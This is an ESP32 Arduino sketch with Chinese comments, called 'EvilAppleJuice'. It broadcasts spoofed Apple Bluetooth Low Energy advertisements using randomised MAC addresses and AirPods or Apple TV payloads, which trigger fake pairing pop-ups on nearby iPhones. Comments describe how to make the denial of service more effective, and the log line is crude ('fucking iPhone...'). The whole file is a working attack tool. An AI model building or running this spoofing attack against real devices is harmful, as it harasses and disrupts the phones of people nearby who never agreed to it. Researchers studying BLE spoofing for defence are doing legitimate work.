// 此示例从 ronaldstoner 的 ESP32 示例中汲取了大量灵感
// 基于之前的工作 chipik / _hexway / ECTO-1A & SAY-10
// 请看 README 来获取更多信息
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

#include "devices.hpp"

BLEAdvertising *pAdvertising;  // 全局变量
uint32_t delayMilliseconds = 500;//每次运行延时 默认500ms

void setup() {
  Serial.begin(115200);
  Serial.println("EvilAppleJuice 启动！");

  //在下面开启您开发版LED的GPIO输出
  //下方还有两处需要修改
  //大部分情况不用改
  pinMode(12, OUTPUT);//AirM2M ESP32
  pinMode(13, OUTPUT);//AirM2M ESP32
  pinMode(2, OUTPUT);//NodeMCU-32S
  pinMode(22, OUTPUT);//？ 是个带锂电池的板子

  BLEDevice::init("AirPods 69");

  // 创建蓝牙服务
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // 似乎我们需要在 setup() 步骤中初始化地址。
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void loop() {
  // 在程序“繁忙”时段打开LED
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);
  digitalWrite(2, HIGH);
  digitalWrite(22, HIGH);

  // 首先生成假随机MAC地址
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // 似乎由于某种原因前 4 位需要高（又名 0b1111）
    //所以我们与 0xF0 异或
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // 从中随机选取一台设备的数据
  // 首先决定短距离设备还是长距离设备
  // 0 = 长（耳机），1 = 短（Apple TV 等杂项）？原注释是这么写的，耳机不应该是短距离设备吗...
  //详见 devices.hpp 中的注释
  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(17);
    oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
  } else {
    int index = random(12);
    oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
  }

/* Apple 的《Apple 设备配件设计指南（Release R20）》第 191 页建议仅使用其中之一
      当您想要连接到 Apple 设备时，三种广告 PDU 类型。
          // 0 = ADV_TYPE_IND,
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      随机使用任何这些 PDU 类型都可以提高欺骗数据包的可检测性。

      我们确定的是：
      - AirPods Gen 2：当盖子打开时，会发送 ADV_TYPE_SCAN_IND 数据包；在配对模式下（按住后壳按钮时），会发送 ADV_TYPE_NONCONN_IND 数据包。
                        如果您想专门针对 Airpods Gen 2，请考虑仅使用这些 PDU 类型。
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // 设置设备地址、广播数据
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // 设置广播间隔
  /* 根据 Apple 的技术问答 QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html)，Apple 建议
      为希望最大限度提高 BLE 配件被 iOS 发现的可能性的开发人员提供 20 毫秒的广播间隔。
      
      这些代码行将间隔固定为 20 毫秒。 启用这些功能可能会提高 DoS 的有效性。 请注意，这尚未经过彻底的测试。
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // 原神启动！
  Serial.println("fucking iPhone...");
  pAdvertising->start();

  //让LED再亮一会，3ms足矣
  //如果嫌LED点亮时间太短，修改下面延时为8
  delay(3);

  // “休眠”时关灯
  digitalWrite(12, LOW);
  digitalWrite(13, LOW);
  digitalWrite(2, LOW);
  digitalWrite(22, LOW);

 // 延时
  delay(delayMilliseconds);
  
  pAdvertising->stop();
}